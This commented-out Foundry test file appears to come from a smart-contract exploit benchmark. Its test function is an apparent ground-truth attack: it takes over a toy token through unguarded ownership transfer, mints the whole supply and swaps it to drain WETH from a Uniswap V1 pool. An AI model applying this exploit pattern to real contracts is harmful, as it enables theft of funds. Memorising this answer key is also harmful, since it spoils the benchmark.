// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.0;

// import "forge-std/Test.sol";

// import "@utils/WETH.sol";
// import "@utils/UniswapV1.sol";

// import "benchmarks/toy/TokenMint/MintableToken.sol";

// contract TokenMintTest is Test {
//     address owner;
//     address attacker;
//     WETH weth;
//     MintableToken token;
//     UniswapV1 uniswap;

//     uint256 public constant totalSupply = 1000 ether;
//     uint256 public constant feeRate = 15;

//     uint256 public constant attackerInitBalance = 0 ether;
//     uint256 public constant attackerInitToken = 10 ether;

//     uint256 public constant uniswapInitBalance = 10 ether;
//     uint256 public constant uniswapInitToken = 10 ether;

//     uint256 public constant requiredBalance = 9 ether;

//     function setUp() public {
//         owner = address(0xdeadbeef);
//         attacker = address(this);

//         vm.startPrank(owner);
//         token = new MintableToken(totalSupply);
//         weth = new WETH(totalSupply);
//         uniswap = new UniswapV1(address(token), address(weth), feeRate);

//         token.transfer(attacker, attackerInitToken);
//         token.transfer(address(uniswap), uniswapInitToken);

//         weth.transfer(attacker, attackerInitBalance);
//         weth.transfer(address(uniswap), uniswapInitBalance);

//         vm.stopPrank();
//     }

//     function testAttackGT() public {
//         token.approve(address(uniswap), UINT256_MAX);
//         token.transferOwnership(address(this));
//         token.mint(address(this), totalSupply);
//         uniswap.swapTokenToWETH(token.balanceOf(address(this)));

//         require(attackGoal(), "Attack Failed!");
//     }

//     function attackGoal() public view returns (bool) {
//         return weth.balanceOf(attacker) >= requiredBalance;
//     }
// }
